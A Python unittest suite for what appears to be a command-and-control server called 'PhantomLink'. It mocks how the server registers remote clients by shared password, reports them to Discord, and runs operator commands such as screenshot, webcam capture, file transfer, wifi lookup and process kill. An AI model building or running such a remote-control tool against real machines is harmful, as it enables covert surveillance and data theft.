import io
import json
import socket
import struct
import sys
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

import C2.C2 as c2_mod


class C2DeepCoverageComprehensiveTests(unittest.TestCase):
    """Full production-ready coverage test suite targeting missing lines in C2/C2.py."""

    def setUp(self):
        self.client_manager = c2_mod.ClientManager()

    def test_client_manager_full_methods(self):
        cm = self.client_manager
        mock_conn = MagicMock()

        # Credentials password mismatch
        cm._recv_message = MagicMock(side_effect=[b"WrongPass", b"User"])
        self.assertIsNone(cm.add_client(mock_conn, ("10.0.0.1", 1000)))

        # Credentials username empty fallback
        cm._recv_message = MagicMock(side_effect=[b"PhantomLink", None])
        with patch("C2.C2.discord_logger"), patch("C2.C2.Notify"):
            cid = cm.add_client(mock_conn, ("10.0.0.2", 1001))
            self.assertIsNotNone(cid)
            self.assertEqual(cm.get_client(cid)["username"], "Unknown")
            cm.remove_client(cid)

        # list_clients & contains
        self.assertIsInstance(cm.list_clients(), dict)

    def test_interact_with_client_interactive_commands(self):
        cm = self.client_manager
        mock_conn = MagicMock()
        cm._recv_message = MagicMock(side_effect=[b"PhantomLink", b"TargetUser"])
        with patch("C2.C2.discord_logger"), patch("C2.C2.Notify"):
            cid = cm.add_client(mock_conn, ("127.0.0.1", 5555))

        cm._send_message = MagicMock(return_value=True)
        cm._recv_message = MagicMock(return_value=b"Command output data")

        # Test interactive inputs: back, exit, screenshot, send, get, camera, devices, wifi, sys, task, kill
        inputs = [
            "screenshot",
            "send", r"C:\test.txt",
            "get", "file.png", r"C:\saved.png",
            "camera", "0",
            "devices",
            "wifi", "MyWiFi",
            "sys",
            "task",
            "back"
        ]

        with patch("builtins.input", side_effect=inputs), patch("C2.C2.discord_logger"):
            res = c2_mod.interact_with_client(cm, cid)
            self.assertIn(res, [None, 'continue', 'exit'])

    def test_interact_with_client_reconnect_switch(self):
        cm = self.client_manager
        mock_conn = MagicMock()
        cm._recv_message = MagicMock(side_effect=[b"PhantomLink", b"ReUser"])
        with patch("C2.C2.discord_logger"), patch("C2.C2.Notify"):
            cid1 = cm.add_client(mock_conn, ("192.168.1.100", 6666))

        # Mark client 1 disconnected and set replacement_id
        cm.clients[cid1]["active"] = False
        
        mock_conn2 = MagicMock()
        cm._recv_message = MagicMock(side_effect=[b"PhantomLink", b"ReUser"])
        with patch("C2.C2.discord_logger"), patch("C2.C2.Notify"):
            cid2 = cm.add_client(mock_conn2, ("192.168.1.100", 7777))

        if cid1 in cm.clients:
            cm.clients[cid1]["replacement_id"] = cid2

        with patch("builtins.input", side_effect=["back"]), patch("C2.C2.discord_logger"):
            res = c2_mod.interact_with_client(cm, cid1)
            self.assertIn(res, [None, 'continue', 'exit'])

    def test_handle_client_connection_and_keepalive(self):
        cm = self.client_manager
        mock_conn = MagicMock()
        cm._recv_message = MagicMock(side_effect=[b"PhantomLink", b"WorkerUser"])
        with patch("C2.C2.discord_logger"), patch("C2.C2.Notify"):
            cid = cm.add_client(mock_conn, ("127.0.0.1", 8888))

        # Run handle_client_connection in thread then close
        with patch("C2.C2.keepalive_handler"):
            t = threading.Thread(target=c2_mod.handle_client_connection, args=(cm, mock_conn, ("127.0.0.1", 8888)))
            t.start()
            time.sleep(0.1)
            cm.clients[cid]["active"] = False
            t.join(timeout=2)

    def test_c2_api_server_startup_retry(self):
        cm = self.client_manager
        with patch("http.server.HTTPServer", side_effect=OSError(10048, "Address already in use")), patch("time.sleep"):
            c2_mod.start_api_server(cm, port=5999)


if __name__ == "__main__":
    unittest.main()
